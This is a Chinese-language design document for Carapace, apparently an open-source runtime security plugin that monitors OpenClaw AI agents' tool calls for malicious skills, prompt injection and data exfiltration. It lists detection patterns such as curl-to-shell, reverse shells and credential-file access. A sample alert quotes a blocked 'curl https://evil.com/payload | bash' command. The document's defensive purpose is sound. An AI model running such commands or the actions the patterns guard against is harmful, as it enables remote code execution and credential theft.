# Carapace — 产品与架构设计文档

> "给你的 AI Agent 披上铠甲。"
> OpenClaw AI Agent 运行时安全监控器。

[English Version](./DESIGN.en.md) · [README (EN)](../README.md) · [README (中文)](../README.zh-CN.md)

---

## 1. 产品愿景

### 1.1 问题陈述

OpenClaw 是目前最流行的开源 AI Agent 框架，但其安全模型存在严重缺陷：

- **权限过于宽泛**：Agent 可以执行 shell 命令、读写任意文件、发起网络请求，缺乏细粒度控制。
- **恶意 Skill 泛滥**：Cisco 研究发现 ClawHub 上约 12% 的 skill（341/2857）为恶意 skill。第三方 skill 可以在用户不知情的情况下外泄数据或执行 prompt injection。
- **CVE-2026-25253（CVSS 8.8）**：证实 RCE 攻击链可在毫秒级完成。
- **零运行时可见性**：OpenClaw 内置的 `security audit` 是静态的、部署前检查。运行时行为监控完全为零。
- **单用户信任模型**：OpenClaw 明确声明不支持对抗性多租户隔离，但即便单用户也需要防护恶意第三方 skill。

### 1.2 解决方案

Carapace 是一个 **OpenClaw 插件**，从 Agent 管道内部提供运行时安全监控。它接入 OpenClaw 原生 hook 系统来观测、分析，并可选地阻断危险的工具调用——完全不需要修改 OpenClaw 源码。

### 1.3 核心差异化

| 维度 | OpenClaw 内置 | Cisco Skill Scanner | Carapace |
|------|--------------|---------------------|----------|
| 分析类型 | 静态配置审计 | 静态 skill 分析（CLI） | **运行时行为监控** |
| 部署方式 | 内置命令 | 独立 CLI 工具 | **原生插件（一条命令安装）** |
| 阻断能力 | 工具策略（允许/拒绝列表） | 无（仅报告） | **通过 before_tool_call 智能阻断** |
| 行为基线 | 无 | 无 | **逐 skill 行为画像** |
| 跨平台 | 是 | 是 | **是（纯 TypeScript，无操作系统依赖）** |
| 持续监控 | 否 | 否 | **是（实时 hook + 日志追踪）** |

### 1.4 OpenClaw 不会做的事（我们的护城河）

- **独立的运行时监控**：OpenClaw 不会监控自身运行时行为——这是利益冲突（标记 skill 为危险会伤害其生态）。
- **第三方信任评分**：OpenClaw 运营 ClawHub，不会客观评价自己市场里的 skill。
- **行为异常检测**：需要 OpenClaw 没有基础设施来收集和分析的持续观测数据。
- **企业安全集成**：OpenClaw 的定位是"个人助手"，不是企业安全工具。

---

## 2. 目标用户

### 2.1 核心用户画像

**画像 1：安全意识强的开发者（"Sarah"）**
- 日常使用 OpenClaw 编码的个人开发者
- 从 ClawHub 安装第三方 skill
- 希望确认 skill 没有做任何恶意操作
- 技术能力足够配置规则，但希望开箱即用的合理默认值
- **核心需求**："有可疑行为就告警我"

**画像 2：技术团队负责人 / 平台工程师（"Marcus"）**
- 管理 5-15 人的开发团队，全员使用 OpenClaw
- 负责团队工具的安全态势
- 需要合规审计日志
- 希望定义组织级安全策略
- **核心需求**："给我跨团队的可见性和控制力"

**画像 3：安全研究员（"Lin"）**
- 分析 ClawHub skill 的漏洞
- 需要 skill 执行的详细行为追踪
- 发布安全公告
- **核心需求**："精确展示这个 skill 在运行时做了什么"

### 2.2 次要用户画像

**画像 4：企业安全团队（"DevSecOps"）**
- 评估 OpenClaw 能否在企业中采用
- 需要 SIEM 集成、合规报告
- 需要工具调用审计追踪
- **核心需求**："证明这个工具对我们的组织足够安全"

---

## 3. 核心用例

### UC-1：新 Skill 安全扫描（MVP）
**触发条件**：用户从 ClawHub 安装了新 skill
**流程**：
1. 用户首次运行该 skill
2. Carapace 通过 hook 监控该会话中所有工具调用
3. 会话结束时生成"首次运行报告"——使用了哪些工具、访问了哪些文件、发起了哪些网络请求
4. 用户查看报告后决定是否信任该 skill
**价值**：在恶意 skill 造成损害之前捕获

### UC-2：实时危险命令告警（MVP）
**触发条件**：任何 skill/agent 执行的工具调用匹配危险模式
**流程**：
1. `before_tool_call` hook 触发
2. Carapace 规则引擎评估该调用
3. 如果是严重威胁（如 `curl | bash`、SSH 密钥访问）：阻断调用并告警用户
4. 如果是中/低级别：允许但记录并告警
**价值**：实时阻止最危险的攻击模式

### UC-3：行为异常检测（v0.2）
**触发条件**：之前受信任的 skill 开始表现异常
**流程**：
1. Carapace 已在 N 个会话中建立了基线（使用的工具、访问的路径、连接的域名）
2. 新会话出现偏离：skill 突然访问 `~/.aws/credentials`（以前从未访问过）
3. 触发告警并附带基线对比
**价值**：捕获被入侵的 skill 或供应链攻击

### UC-4：审计日志导出（v0.2）
**触发条件**：用户/管理员需要所有工具调用的记录
**流程**：
1. Carapace 持续将所有工具调用记录为结构化 JSON
2. 用户导出时间范围内的日志
3. 日志可导入 SIEM（Splunk、ELK 等）
**价值**：合规和取证调查

### UC-5：组织级策略执行（v0.3）
**触发条件**：团队负责人定义安全策略
**流程**：
1. 管理员创建策略文件（如"禁止任何 skill 执行 shell 命令"、"仅允许访问 *.company.com"）
2. 策略分发给所有团队成员的 Carapace 实例
3. 违规行为集中上报
**价值**：企业安全治理

---

## 4. 竞争格局

### 4.1 直接竞品（AI Agent 安全）

| 产品 | 方案 | 弱点 |
|------|------|------|
| Cisco Skill Scanner | ClawHub skill 的静态分析 CLI | 无运行时监控、无阻断、仅 CLI |
| Reco AI Agent Security | 企业 AI 治理的 Cloud SaaS | 昂贵、仅云端、非 OpenClaw 专用 |
| CrowdStrike AI Protection | 带 AI agent 感知的端点安全 | 对个人开发者太重 |
| Prompt Armor | Prompt injection 检测 API | 只覆盖一个攻击向量、SaaS 依赖 |

### 4.2 间接竞品

| 产品 | 相关性 |
|------|--------|
| Falco（Kubernetes） | 类似概念（运行时安全）但面向容器，非 AI agent |
| Snyk / Socket.dev | 包安全扫描——相同模型应用于 npm，非 skill |
| OpenClaw Tool Policy | 内置允许/拒绝列表——静态，无智能 |

### 4.3 我们的定位

**Carapace = AI Agent 领域的 Falco**：轻量级、开源、运行时行为安全，作为原生插件运行——而非笨重的外部工具。

---

## 5. 开源策略

### 5.1 完全开源（MIT 许可证）

Carapace 是一个 **100% 开源** 的项目，所有功能对所有用户免费开放：

- 核心规则引擎（ExecGuard、PathGuard、NetworkGuard、PromptInjection、DataExfil、BaselineDrift、RateLimiter）
- 实时告警（控制台、webhook、日志文件）
- JSONL 会话日志追踪
- 逐 skill 行为基线
- 新 Skill 首次运行报告
- CLI 审计工具
- Dashboard Web UI（事件时间线）
- SIEM 集成（Splunk、Elasticsearch、Datadog、Syslog 连接器）
- 团队集中式策略管理（继承链、导入/导出）
- YAML 自定义规则
- MCP 代理适配器
- LangChain/CrewAI Python 桥接

### 5.2 可持续发展

作为一个开源项目，Carapace 依靠社区贡献和赞助来持续发展：

- **GitHub Sponsors**：接受个人和企业赞助
- **社区贡献**：欢迎提交新规则、适配器和 Bug 修复
- **咨询服务**：为需要定制安全策略的企业提供专业咨询（可选）

---

## 6. 技术架构

### 6.1 系统概览

```
┌──────────────────────────────────────────────────────────────┐
│                    OpenClaw Gateway (Node.js)                 │
│                                                              │
│  用户消息 → Agent 管道 → 工具选择 → 执行                       │
│       │         │           │          │                     │
│       ▼         ▼           ▼          ▼                     │
│  ┌────────────────────────────────────────────────────────┐  │
│  │              Carapace 插件 (TypeScript)                 │  │
│  │                                                        │  │
│  │  ┌──────────────────────────────────────────────────┐  │  │
│  │  │              Hook 拦截器                          │  │  │
│  │  │  • before_tool_call  (阻断/修改/观测)             │  │  │
│  │  │  • after_tool_call   (观测结果)                   │  │  │
│  │  │  • session_start     (初始化会话追踪)             │  │  │
│  │  │  • session_end       (生成会话报告)               │  │  │
│  │  │  • gateway_start     (启动审计)                   │  │  │
│  │  └──────────────┬───────────────────────────────────┘  │  │
│  │                 │                                      │  │
│  │  ┌──────────────▼───────────────────────────────────┐  │  │
│  │  │              规则引擎                              │  │  │
│  │  │  • ExecGuard        (危险 shell 命令)             │  │  │
│  │  │  • PathGuard        (敏感文件路径)                 │  │  │
│  │  │  • NetworkGuard     (可疑 URL/域名)               │  │  │
│  │  │  • PromptInjection  (提示词注入检测)              │  │  │
│  │  │  • DataExfil        (数据外泄检测)                │  │  │
│  │  │  • RateLimiter      (工具调用频率异常)             │  │  │
│  │  │  • BaselineDrift    (行为偏离检测)                │  │  │
│  │  └──────────────┬───────────────────────────────────┘  │  │
│  │                 │                                      │  │
│  │  ┌──────────────▼───────────────────────────────────┐  │  │
│  │  │           事件处理器                               │  │  │
│  │  │  • 去重        (时间窗口内相同事件)                 │  │  │
│  │  │  • 关联        (相关事件 → 安全事件)               │  │  │
│  │  │  • 富化        (补充 skill/session 上下文)         │  │  │
│  │  └──────────────┬───────────────────────────────────┘  │  │
│  │                 │                                      │  │
│  │  ┌──────────────▼───────────────────────────────────┐  │  │
│  │  │           告警路由                                 │  │  │
│  │  │  • Console    (带颜色的 stderr)                   │  │  │
│  │  │  • Webhook    (Slack/Discord/Teams/自定义)        │  │  │
│  │  │  • LogFile    (结构化 JSON，供 SIEM 消费)         │  │  │
│  │  │  • HookMsg    (注入 agent 对话)                   │  │  │
│  │  └─────────────────────────────────────────────────┘  │  │
│  │                                                        │  │
│  │  ┌──────────────────────────────────────────────────┐  │  │
│  │  │           数据存储 (SQLite)                       │  │  │
│  │  │  • 安全事件日志                                    │  │  │
│  │  │  • Skill 行为基线                                  │  │  │
│  │  │  • 会话元数据                                      │  │  │
│  │  │  • 配置缓存                                        │  │  │
│  │  └─────────────────────────────────────────────────┘  │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐  │
│  │     Session JSONL Tailer (补充数据源)                   │  │
│  │     ~/.openclaw/sessions/*.jsonl → 解析 → 供给规则引擎  │  │
│  └────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────┘
```

### 6.2 为什么选择插件架构（而非 Sidecar）

| 因素 | 插件（已选） | Sidecar（已弃） |
|------|-------------|----------------|
| 跨平台 | ✅ 纯 TS，Windows/Mac/Linux | ❌ eBPF 仅 Linux |
| 安装复杂度 | `openclaw plugins install carapace` | 独立 daemon，需要 root 权限 |
| 数据丰富度 | 完整语义上下文（skill 名、工具参数、session） | 仅原始系统调用 |
| 阻断能力 | `before_tool_call` 可拒绝调用 | 只能 kill 进程（太迟了） |
| 性能开销 | 可忽略（进程内） | IPC + eBPF 开销 |
| 维护成本 | 跟随 OpenClaw API | 需追踪内核版本 |

### 6.3 Hook 集成点

OpenClaw 提供 24 个 hook，Carapace 使用其中 6 个：

| Hook | 模式 | Carapace 用途 |
|------|------|---------------|
| `before_tool_call` | 异步顺序（可修改） | **主要拦截点**。评估规则，可选地通过返回 `{ blocked: true, reason: "..." }` 阻断严重威胁 |
| `after_tool_call` | 触发即忘 | **结果观测**。记录工具结果，供给基线建模器，检测响应中的数据外泄 |
| `session_start` | 触发即忘 | 初始化会话追踪，重置会话内计数器 |
| `session_end` | 触发即忘 | 生成会话摘要报告，更新 skill 基线 |
| `gateway_start` | 触发即忘 | 启动审计：检查 OpenClaw 配置是否存在不安全设置，初始化 SQLite |
| `gateway_stop` | 触发即忘 | 刷新待处理告警，关闭数据库连接 |

#### Hook 注册示例

```typescript
// 在插件 register() 函数中
api.on("before_tool_call", async (event, ctx) => {
  const ruleCtx: RuleContext = {
    toolName: event.toolName,
    toolParams: event.params,
    toolCallId: event.toolCallId,
    sessionId: ctx.sessionId,
    agentId: ctx.agentId,
    skillName: ctx.currentSkill,
    timestamp: Date.now(),
  };

  const result = ruleEngine.evaluate(ruleCtx);

  if (result.shouldBlock && config.blockOnCritical) {
    alertRouter.send(result.event);
    return { block: true, blockReason: result.event.title };
  }

  if (result.triggered) {
    alertRouter.send(result.event);
  }

  return {}; // 允许调用继续
}, { priority: 100 }); // 高优先级 = 在链中更早运行
```

### 6.4 双数据源策略

Carapace 使用两个互补的数据源：

**主要：Hook 系统（实时）**
- `before_tool_call` / `after_tool_call` 提供结构化、类型化的事件
- 可实时阻断调用
- 覆盖所有经过 agent 管道的工具调用
- 局限：仅捕获工具调用，不捕获 skill 绕过工具系统的原始文件/网络访问

**补充：JSONL 会话日志追踪（辅助）**
- `~/.openclaw/sessions/<sessionId>.jsonl` 记录完整对话脚本
- 提供完整对话上下文用于关联分析
- 通过 `fs.watch` 跨平台（Windows、macOS、Linux）
- 用途：事后分析、取证调查、对话级异常检测
- 局限：略有延迟（写入发生在工具执行之后）

双源策略确保无盲点：hook 实时捕获工具调用，JSONL 捕获其他所有内容。

---

## 7. 数据模型

### 7.1 安全事件 Schema

```typescript
interface SecurityEvent {
  // 身份标识
  id: string;                    // "cpc_" + 12 位十六进制字符
  timestamp: number;             // Unix 毫秒时间戳

  // 分类
  category: EventCategory;       // exec_danger | path_violation | network_suspect | ...
  severity: Severity;            // critical | high | medium | low | info
  title: string;                 // 人类可读标题
  description: string;           // 详细说明

  // OpenClaw 上下文
  toolName: string;              // 触发事件的工具
  toolParams: object;            // 完整工具参数（已脱敏）
  toolCallId?: string;           // OpenClaw 的工具调用 ID
  skillName?: string;            // 发起调用的 skill
  sessionId?: string;            // 会话 ID
  agentId?: string;              // Agent ID

  // 规则元数据
  ruleName: string;              // 触发的规则
  matchedPattern?: string;       // 匹配的具体模式

  // 采取的操作
  action: "alert" | "blocked";   // Carapace 的处理结果
}
```

### 7.2 Skill 基线 Schema

```typescript
interface SkillBaseline {
  skillName: string;
  firstSeen: number;             // Unix 毫秒
  lastSeen: number;              // Unix 毫秒
  sessionCount: number;          // 观测到的总会话数

  // 行为指纹
  toolUsage: Map<string, {
    callCount: number;
    avgParamsSize: number;
    lastSeen: number;
  }>;

  pathPatterns: Set<string>;     // 访问过的文件路径（泛化为模式）
  domainPatterns: Set<string>;   // 连接过的网络域名
  commandPatterns: Set<string>;  // 执行过的 shell 命令（标准化）

  // 统计画像
  avgToolCallsPerSession: number;
  stdDevToolCalls: number;
  maxToolCallsObserved: number;
}
```

### 7.3 SQLite 表结构

```sql
-- 安全事件（仅追加日志）
CREATE TABLE events (
  id TEXT PRIMARY KEY,
  timestamp INTEGER NOT NULL,
  category TEXT NOT NULL,
  severity TEXT NOT NULL,
  title TEXT NOT NULL,
  description TEXT,
  tool_name TEXT,
  skill_name TEXT,
  session_id TEXT,
  agent_id TEXT,
  rule_name TEXT,
  action TEXT NOT NULL,
  details_json TEXT,        -- 完整事件详情（JSON）
  created_at INTEGER DEFAULT (strftime('%s', 'now') * 1000)
);

CREATE INDEX idx_events_timestamp ON events(timestamp);
CREATE INDEX idx_events_severity ON events(severity);
CREATE INDEX idx_events_skill ON events(skill_name);

-- Skill 基线（增量更新）
CREATE TABLE skill_baselines (
  skill_name TEXT PRIMARY KEY,
  first_seen INTEGER NOT NULL,
  last_seen INTEGER NOT NULL,
  session_count INTEGER DEFAULT 0,
  tool_usage_json TEXT,     -- 序列化 Map
  path_patterns_json TEXT,  -- 序列化 Set
  domain_patterns_json TEXT,
  command_patterns_json TEXT,
  avg_calls_per_session REAL DEFAULT 0,
  std_dev_calls REAL DEFAULT 0,
  max_calls_observed INTEGER DEFAULT 0
);

-- 会话追踪
CREATE TABLE sessions (
  session_id TEXT PRIMARY KEY,
  agent_id TEXT,
  started_at INTEGER NOT NULL,
  ended_at INTEGER,
  tool_call_count INTEGER DEFAULT 0,
  event_count INTEGER DEFAULT 0,
  skills_used_json TEXT
);
```

---

## 8. 规则引擎设计

### 8.1 规则执行流程

```
工具调用事件
     │
     ▼
┌──────────┐ ┌──────────┐ ┌────────────┐ ┌─────────────────┐
│ExecGuard │▶│PathGuard │▶│NetworkGuard│▶│PromptInjection  │
└──────────┘ └──────────┘ └────────────┘ └────────┬────────┘
                                                   ▼
             ┌─────────────┐ ┌───────────┐ ┌──────────────┐
             │BaselineDrift │◀│RateLimiter│◀│  DataExfil   │
             └──────┬──────┘ └───────────┘ └──────────────┘
                    ▼
  合并结果（最高严重级别优先）
       │
       ▼
  事件处理器（去重 + 富化）
       │
       ▼
  告警路由（分发到各渠道）
```

### 8.2 规则类型

| 规则 | 分类 | 触发条件 | 默认操作 |
|------|------|---------|----------|
| **ExecGuard** | exec_danger | 危险 shell 命令模式（curl\|sh、base64\|bash、反弹 shell、编码 PowerShell） | 阻断严重，告警其他 |
| **PathGuard** | path_violation | 敏感文件访问（~/.ssh/、~/.aws/、浏览器数据、加密钱包、.env 文件） | 阻断严重，告警其他 |
| **NetworkGuard** | network_suspect | 可疑 URL（粘贴服务、文件共享、webhook 捕获器、.onion、裸 IP） | 阻断 .onion，告警其他 |
| **RateLimiter** | rate_anomaly | 工具调用频率超阈值（默认 60/分钟）或突增（基线的 3 倍） | 仅告警 |
| **PromptInjection** | prompt_injection | 工具参数中检测到提示词注入模式（指令覆盖、角色劫持、编码注入） | 阻断严重，告警其他 |
| **DataExfil** | data_exfil | 检测到数据外泄模式（敏感数据经网络/文件/剪贴板外传） | 阻断严重，告警其他 |
| **BaselineDrift** | baseline_drift | Skill 访问了不在其学习画像中的新工具/路径/域名 | 仅告警 |

### 8.3 规则优先级与冲突解决

规则按顺序评估。如果同一工具调用触发了多条规则：
1. **最高严重级别优先**用于告警
2. **任一 shouldBlock=true** → 阻断调用（逻辑 OR）
3. **所有事件均被记录**，不受去重影响

### 8.4 自定义规则 API（v0.2）

用户可在 Carapace 配置中定义自定义规则：

```yaml
# ~/.openclaw/carapace.yml
customRules:
  - name: "no-production-db"
    description: "阻断连接到生产数据库"
    match:
      toolName: ["exec", "bash"]
      paramContains: "prod-db.company.com"
    severity: critical
    action: block

  - name: "limit-file-writes"
    description: "对项目目录外的写入告警"
    match:
      toolName: ["file_write", "write"]
      paramNotMatch:
        path: "^/home/user/projects/"
    severity: medium
    action: alert
```

---

## 9. 告警系统设计

### 9.1 告警渠道

| 渠道 | 配置项 | 格式 | 使用场景 |
|------|--------|------|---------|
| **Console** | （始终开启） | 带颜色的 stderr 输出 | 开发者终端 |
| **Webhook** | `alertWebhook` | JSON POST 到 URL | Slack、Discord、Teams |
| **LogFile** | `logFile` | JSON Lines（每事件一行） | SIEM 接入、审计追踪 |
| **HookMessage** | （严重事件始终开启） | 将警告注入 agent 对话 | 用户在聊天中看到告警 |

### 9.2 告警去重

同一规则 + 同一工具 + 相同参数在 **5 分钟窗口内** → 抑制重复告警。
实现：`hash(ruleName + toolName + paramHash)` 的 LRU 缓存，带 TTL。

### 9.3 告警升级

```
首次出现            → 按检测到的严重级别告警
10 分钟内 3 次      → 严重级别上升一级
10 分钟内 10 次     → 强制为 CRITICAL + 建议启用阻断
```

### 9.4 Webhook 载荷格式

```json
{
  "source": "carapace",
  "version": "0.10.3",
  "event": {
    "id": "cpc_a1b2c3d4e5f6",
    "timestamp": "2026-03-09T20:30:00Z",
    "severity": "critical",
    "category": "exec_danger",
    "title": "远程代码执行：curl 管道到 shell",
    "description": "Skill 'calendar-sync' 尝试执行: curl https://evil.com/payload | bash",
    "toolName": "exec",
    "skillName": "calendar-sync",
    "action": "blocked"
  }
}
```

---

## 10. 行为基线设计

### 10.1 学习策略

**冷启动（每个 skill 的前 20 次调用）**：
- 仅硬规则生效（ExecGuard、PathGuard、NetworkGuard、PromptInjection、DataExfil）
- 所有工具调用被记录以构建初始基线
- 不触发异常告警（误报率太高）
- 20 次调用后：基线"冻结"，BaselineDrift 激活

**预热阶段（学习阈值后）**：
- BaselineDrift 将每次工具调用与 skill 画像对比
- 新工具/路径/域名 → 告警为 `baseline_drift`
- 基线继续缓慢更新（指数移动平均）
- 重大变化需要重新学习（用户可手动触发）

### 10.2 路径泛化

原始文件路径被泛化为模式用于基线匹配：
- `/home/user/projects/myapp/src/index.ts` → `/home/user/projects/*/src/*`
- `/tmp/openclaw-12345/scratch.txt` → `/tmp/openclaw-*/scratch.*`

这样可以防止临时路径导致的误报，同时捕获真正的新访问模式。

### 10.3 误报管理

用户可以驳回误报，创建一个**例外**：
```bash
carapace dismiss <event-id>              # 驳回单个事件
carapace trust <skill-name> --tool exec  # 信任某个 skill 使用特定工具
carapace trust <skill-name> --path "~/.config/myapp/*"  # 信任特定路径模式
```

例外存储在 SQLite 中，在告警前检查。

---

## 11. 配置设计

### 11.1 配置来源（优先级从高到低）

1. **CLI 参数**（最高优先级）
2. **环境变量**（`CARAPACE_*`）
3. **项目配置**（工作目录下的 `.carapace.yml`）
4. **用户配置**（`~/.openclaw/carapace.yml`）
5. **默认值**（最低优先级）

### 11.2 完整配置 Schema

```yaml
# ~/.openclaw/carapace.yml

# 告警渠道
alertWebhook: "https://hooks.slack.com/services/T00/B00/xxx"
logFile: "~/.openclaw/carapace/events.jsonl"

# 阻断行为
blockOnCritical: false      # true = 阻断严重威胁（默认仅告警）

# 频率限制
maxToolCallsPerMinute: 60   # 工具调用频率告警阈值

# 行为基线
enableBaseline: true        # 启用行为学习和异常检测
baselineLearningPeriod: 5   # 基线激活前的会话数

# 自定义敏感路径（追加到默认列表）
sensitivePathPatterns:
  - "/home/user/.myapp/secrets/*"
  - "*.credential"

# 自定义阻断域名（追加到默认列表）
blockedDomains:
  - "competitor.com"
  - "*.ru"

# 受信任 skill（跳过基线告警）
trustedSkills:
  - "official/file-manager"
  - "official/git"

# 自定义规则
customRules: []

# 详细日志
debug: false
```

---

## 12. CLI 命令

```bash
# 状态和信息
carapace status              # 显示 Carapace 状态、活跃规则、近期事件
carapace config              # 显示生效配置

# 事件管理
carapace events              # 列出近期安全事件
carapace events --severity critical --since 24h
carapace events --skill "calendar-sync"
carapace events --export csv > events.csv

# Skill 信任管理
carapace skills              # 列出所有观测到的 skill 及信任评分
carapace skills inspect <name>  # 显示详细行为画像
carapace trust <skill> [--tool X] [--path Y] [--domain Z]
carapace untrust <skill>

# 初始化和配置
carapace init                # 初始化 Carapace 配置文件
carapace setup               # 交互式安全策略配置向导

# 手动操作
carapace scan                # 一次性审计当前 OpenClaw 配置
carapace report <session-id> # 生成某会话的详细报告
carapace baseline reset <skill>  # 重置某 skill 的基线

# 演示和监控
carapace demo                # 运行内置演示场景
carapace dashboard           # 启动安全事件仪表盘
carapace test-rule <rule>    # 测试单条规则

# 驳回管理
carapace dismiss <event-id>
carapace dismissals list
carapace dismissals clear
```

---

## 13. MVP 交付计划

### Phase 0：基础搭建（第 1 周）

**交付物：**
- [x] 项目脚手架：package.json、tsconfig、目录结构
- [x] 类型定义（SecurityEvent、RuleContext、CarapaceConfig）
- [x] 插件入口与 hook 注册骨架
- [x] SQLite 初始化和 schema 迁移
- [x] 单元测试框架（vitest）

**完成标准：** 插件可在 OpenClaw 中加载无报错，hook 已注册

### Phase 1：核心规则（第 2 周）

**交付物：**
- [x] ExecGuard：112 危险命令模式
- [x] PathGuard：64 敏感路径模式（Windows、macOS、Linux）
- [x] NetworkGuard：40 可疑域名模式（20 类别）
- [x] 带优先级和冲突解决的规则引擎
- [x] 控制台告警（带颜色的 stderr）

**完成标准：** 三条规则在单元测试中检测已知攻击模式准确率 >95%

### Phase 2：Hook 集成（第 3 周）

**交付物：**
- [x] `before_tool_call` hook 含阻断支持
- [x] `after_tool_call` hook 用于结果观测
- [x] `session_start` / `session_end` hook 用于会话追踪
- [x] 带去重的事件处理器
- [x] Webhook 告警（Slack/Discord 格式）

**完成标准：** 端到端测试：恶意 skill → 检测 → 告警 → 阻断（blockOnCritical 开启时）

### Phase 3：行为基线（第 4-5 周）

**交付物：**
- [x] JSONL 会话日志 tailer
- [x] 逐 skill 基线建模器
- [x] RateLimiter（频率异常）
- [x] BaselineDrift（偏离检测）
- [x] 首次运行报告生成器
- [x] `carapace skills` CLI 命令

**完成标准：** 基线在 20 次调用后建立，能检测到新工具/路径/域名访问

### Phase 4：打磨与发布（第 6 周）

**交付物：**
- [x] README（安装指南和截图）
- [x] 配置文档
- [x] npm 包发布
- [x] GitHub Actions CI/CD
- [x] ClawHub 上架（如适用）
- [x] 发布博文草稿

**完成标准：** `openclaw plugins install carapace` 端到端可用

---

## 14. 风险分析

| 风险 | 概率 | 影响 | 缓解措施 |
|------|------|------|---------|
| OpenClaw 变更 hook API | 中 | 高 | 锁定 API 版本，监控 OpenClaw 发布，维护兼容层 |
| 高误报率 | 高 | 中 | 保守的默认值，便捷的驳回 UX，基线学习随时间降低误报 |
| 性能开销 | 低 | 高 | 异步评估，LRU 缓存，规则短路 |
| OpenClaw 推出竞争功能 | 中 | 高 | 扩展为多框架支持（LangChain、CrewAI adapter 层） |
| JSONL 格式变更 | 中 | 低 | 仅为补充数据源；hook 为主 |
| 用户信任阻力（"又一个监控我的插件"） | 中 | 中 | 开源，纯本地处理，无遥测，清晰的隐私政策 |

---

## 15. 成功指标

| 指标 | 目标（第 3 个月） | 目标（第 6 个月） |
|------|------------------|------------------|
| npm 安装量 | 1,000 | 5,000 |
| GitHub star | 200 | 1,000 |
| 日活用户（遥测 opt-in） | 100 | 500 |
| 阻断的严重威胁 | 追踪计数 | 追踪计数 |
| 误报率 | <20% | <5% |
| 平均规则评估耗时 | <5ms | <2ms |
| 插件加载开销 | <50ms | <30ms |

---

## 16. 多框架 Adapter 架构

### 16.1 为什么需要多框架支持

仅绑定 OpenClaw 是战略风险：如果 OpenClaw 自己补上安全功能，或市场份额转移到其他框架，Carapace 就失去了价值。目标是让 Carapace 成为 **AI Agent 的通用运行时安全层**，OpenClaw 只是第一个 adapter。

目标框架（优先级排序）：
1. **OpenClaw** — 首个 adapter（MVP）。最大的开源 agent 社区。
2. **LangChain / LangGraph** — Python 生态，海量用户。使用 "callbacks" 系统做 hook。
3. **CrewAI** — 多 agent 框架。使用 "task callbacks" 和 "agent callbacks"。
4. **AutoGen（Microsoft）** — 使用 agent 上的 "hook" 注册。
5. **Claude Code / Agent SDK** — Anthropic 的 agent 框架。hook 系统类似 OpenClaw。
6. **自定义 MCP Server** — 任何 Model Context Protocol 服务器都可以被包装。

### 16.2 Core / Adapter 分层

```
┌─────────────────────────────────────────────────────────────┐
│                    @carapace/core                            │
│                                                             │
│  ┌───────────────┐  ┌───────────────┐  ┌────────────────┐  │
│  │  规则引擎      │  │  事件处理器    │  │  告警路由      │  │
│  │  (ExecGuard,   │  │ (去重, 富化,   │  │  (console,     │  │
│  │   PathGuard,   │  │  关联)        │  │   webhook,     │  │
│  │   NetworkGuard │  │               │  │   logfile)     │  │
│  │   RateLimiter, │  │               │  │               │  │
│  │   Baseline)    │  │               │  │               │  │
│  └───────┬───────┘  └───────┬───────┘  └───────┬────────┘  │
│          │                  │                   │           │
│  ┌───────▼──────────────────▼───────────────────▼────────┐  │
│  │              统一事件总线                               │  │
│  │   emit(ToolCallEvent) → 评估 → 告警                    │  │
│  └───────────────────────▲───────────────────────────────┘  │
│                          │                                  │
│  ┌───────────────────────┴───────────────────────────────┐  │
│  │              Adapter 接口（抽象）                       │  │
│  │                                                       │  │
│  │  interface FrameworkAdapter {                          │  │
│  │    name: string;                                      │  │
│  │    version: string;                                   │  │
│  │    initialize(config: CarapaceConfig): Promise<void>; │  │
│  │    // 将框架特定事件转换为 ToolCallEvent               │  │
│  │    normalizeEvent(raw: unknown): ToolCallEvent;       │  │
│  │    // 在目标框架中注册 hook                            │  │
│  │    registerHooks(bus: EventBus): Promise<void>;       │  │
│  │    // 可选：阻断工具调用（如框架支持）                  │  │
│  │    blockCall?(callId: string, reason: string): void;  │  │
│  │    shutdown(): Promise<void>;                         │  │
│  │  }                                                    │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘

Adapter（独立包）：

┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐
│ @carapace/       │  │ @carapace/       │  │ @carapace/       │
│ adapter-openclaw │  │ adapter-langchain│  │ adapter-crewai   │
│                  │  │                  │  │                  │
│ • OpenClaw 插件  │  │ • LangChain      │  │ • CrewAI         │
│ • Hook API       │  │   CallbackHandler│  │   task/agent     │
│ • JSONL tailer   │  │ • Python bridge  │  │   callbacks      │
│ • before/after   │  │   (stdio IPC)    │  │ • Python bridge  │
│   tool_call      │  │ • 支持阻断       │  │                  │
└──────────────────┘  └──────────────────┘  └──────────────────┘

┌──────────────────┐  ┌──────────────────┐
│ @carapace/       │  │ @carapace/       │
│ adapter-autogen  │  │ adapter-mcp      │
│                  │  │                  │
│ • AutoGen hook   │  │ • MCP 协议       │
│   注册           │  │   拦截器         │
│ • Python bridge  │  │ • 通用，适用于    │
│                  │  │   任何 MCP 服务器 │
└──────────────────┘  └──────────────────┘
```

### 16.3 标准化事件模型

所有 adapter 将框架特定事件转换为统一的 `ToolCallEvent`：

```typescript
// @carapace/core
interface ToolCallEvent {
  // 框架无关字段
  id: string;                    // 唯一调用 ID
  timestamp: number;
  framework: string;             // "openclaw" | "langchain" | "crewai" | ...
  phase: "before" | "after";     // 执行前还是执行后

  // 工具调用数据（跨框架标准化）
  toolName: string;              // 标准化工具名
  toolParams: Record<string, unknown>;
  toolResult?: unknown;          // 仅 "after" 阶段

  // Agent 上下文（尽力提供，因框架而异）
  agentId?: string;
  sessionId?: string;
  skillName?: string;            // OpenClaw: skill 名。LangChain: chain 名。
  conversationId?: string;

  // 原始事件（供框架特定规则使用）
  rawEvent: unknown;
}
```

### 16.4 非 JS 框架的 Python Bridge

LangChain、CrewAI 和 AutoGen 是 Python 框架。Carapace 核心是 TypeScript。桥接通过 **stdio IPC** 实现：

```
┌─────────────────────┐    stdio (JSON lines)    ┌──────────────────────┐
│  Python 进程         │ ◄──────────────────────► │  Carapace core       │
│                      │                          │  (Node.js)           │
│  • LangChain 应用    │   → ToolCallEvent JSON   │                      │
│  • carapace-py shim  │   ← BlockDecision JSON   │  • 规则引擎          │
│    (pip install)     │                          │  • 告警路由           │
└─────────────────────┘                          └──────────────────────┘
```

**carapace-py** 是一个轻量 Python 包：
```python
# pip install carapace-agent
from carapace import CarapaceMonitor

# LangChain 集成
from langchain.callbacks import BaseCallbackHandler

class CarapaceCallback(BaseCallbackHandler):
    def __init__(self):
        self.monitor = CarapaceMonitor()  # 启动 Node.js core 进程

    def on_tool_start(self, tool, input_str, **kwargs):
        decision = self.monitor.check_tool_call(
